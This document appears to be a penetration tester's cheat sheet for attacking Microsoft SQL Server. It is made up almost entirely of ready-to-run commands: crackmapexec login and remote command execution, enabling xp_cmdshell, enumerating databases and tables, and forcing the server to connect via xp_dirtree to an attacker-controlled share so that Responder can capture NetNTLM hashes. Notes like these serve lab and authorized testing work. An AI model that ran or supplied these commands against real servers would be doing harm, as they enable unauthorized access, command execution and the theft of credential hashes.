**MSSQL:**
---
```sh
sqsh -S $TARGET_IP:$PORT -U $DOMAIN\\$USER -P $PASS
```

```shell
crackmapexec mssql $TARGET_IP -u $USER -p $PASSWORD
```

```shell
crackmapexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -L
```

Try to execute command on server:
```shell
crackmapexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -x 'ping $ATTACKER'
```
and on attacker box:
```shell
sudo tcpdump -i tun0 icmp -n
```

Try to start mssql_priv:

```shell
crackmapexec mssql --local-auth $TARGET_IP -u $USER -p $PASSWORD -M mssql_priv
```

One client is mssqlclient.py:

```shell
mssqlclient.py $USER:$PASSWORD@$DOMAIN
```

Or use impacket to open console:

```shell
impacket-mssqlclient $TARGET_DOMAIN/$TARGET_USER:$TARGET_PASSWORD@$TARGET_NAME
```

Try:

```mssql
enable_xp_cmdshell
```

in MSSQL server try, start responder on attacker box:
```sql
xp_dirtree "\\$ATTACKER_IP\fake\share";
```

List files:
---

```sql
xp_dirtree "c:\inetpub\";
xp_dirtree "c:\inetpub\",2,2;
```

**List databases:**
---
```sql
SELECT name, database_id, create_date FROM sys.databases;
```

Show current DB name:
```sql
SELECT db_name();
```

```sql
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;
```

**List tables in selected DB:**
---
#mssql 

```sql
SELECT * FROM SYSOBJECTS WHERE xtype = 'U';
```

```sql
SELECT name FROM $DB_NAME..sysobjects WHERE xtype = 'U' order by name offset 1 rows fetch next 1 rows only)
```
List columns:
---
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '$COLUMN') order by name offset 1 rows fetch next 1 rows only
```

and offset for each entry
List column:
---
```sql
SELECT top 1 $COLUMN from $TABLE ORDER BY $COLUMN;
```
```sql
SELECT top 1 $COLUMN from $TABLE ORDER BY $COLUMN offset 1 rows fetch next 1 rows only;
```
Leak NetNTLM hashes
---
#hash #ntlm #netntlm #responder
Start responder or another hash grabber to get user and hash:

```bash
sudo responder.py -I tun0
```

and trick the MSSQL server to connect to the "share":

```sql
exec master.dbo.xp_dirtree '//$LOCAL_IP/non/existing'
```

